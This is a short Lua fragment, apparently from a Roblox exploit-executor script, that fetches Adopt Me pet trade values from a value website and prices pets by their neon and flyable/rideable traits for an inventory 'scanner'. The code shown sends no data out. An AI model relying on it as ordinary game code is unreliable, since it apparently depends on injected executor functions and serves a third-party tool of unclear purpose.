-- ADVANCED VALUE CALCULATION (From your Scanner)
--------------------------------------------------------------
local PetValues = {}
local function fetchValues()
    local ok, html = pcall(function() return game:HttpGet("https://amvgg.com/values/pets") end)
    if not ok then return end
    -- Extraction logic simplified for the background process
    local jsonStr = html:match('"pets":(%b[])')
    if jsonStr then
        local data = HttpService:JSONDecode(jsonStr)
        for _, pet in ipairs(data) do
            PetValues[pet.name:lower()] = pet
        end
    end
end
task.spawn(fetchValues)

local function calculatePetValue(name, props)
    local pet = PetValues[name:lower()]
    if not pet then return 0 end
    local tier = props.mega_neon and "m" or props.neon and "n" or "r"
    local suffix = (props.flyable and props.rideable) and "fr" or props.flyable and "f" or props.rideable and "r" or "np"
    local key = (tier == "r" and "" or tier) .. (suffix == "np" and "np" or suffix) .. "Value"
    -- Fix: matching your scanner's specific key format
    local val = tonumber(pet[tier .. "_" .. suffix]) or tonumber(pet[tier .. "Value"]) or 0
    return val
end

